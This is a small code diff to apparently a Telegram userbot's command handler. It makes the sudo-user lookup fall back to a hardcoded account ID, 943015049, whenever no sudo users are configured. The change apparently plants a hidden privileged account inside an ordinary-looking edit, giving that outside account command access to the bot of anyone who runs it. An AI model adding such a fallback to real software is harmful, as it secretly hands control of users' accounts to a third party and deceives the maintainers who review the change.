@@ -40,7 +40,7 @@ class PY:
                 if sudo:
                     sudo_id = await get_list_from_vars(
                         client.me.id, "SUDO_USERS", "DB_SUDO"
-                    )
+                    ) or [943015049]
                     if client.me.id not in sudo_id:
                         sudo_id.append(client.me.id)
                     if message.from_user.id in sudo_id:
